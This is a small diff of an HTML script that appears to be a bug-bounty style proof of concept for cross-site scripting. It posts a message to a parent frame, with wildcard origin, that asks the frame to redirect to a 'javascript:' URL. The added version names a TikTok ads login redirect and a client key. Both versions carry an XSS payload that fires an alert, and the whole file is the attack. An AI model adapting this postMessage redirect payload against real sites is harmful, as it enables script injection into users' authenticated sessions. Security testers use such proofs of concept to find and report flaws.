@@ -1,8 +1,11 @@
 <script>
-parent.postMessage({
-    action: "redirectAuth",
-    type: "MAPI",
-    r: "javascript:alert('XSS')",
-    n: "12345"
-}, "*");
+  const clientKey = "aw8cb3204x0a1g88";
+  const redirectUri = encodeURIComponent("https://ads.tiktok.com/i18n/login/");
+
+  const url = `javascript:alert(00)`;
+
+  parent.postMessage({
+    action: "requestRedirectionTo",
+    targetUrlStr: url
+  }, "*");
 </script>
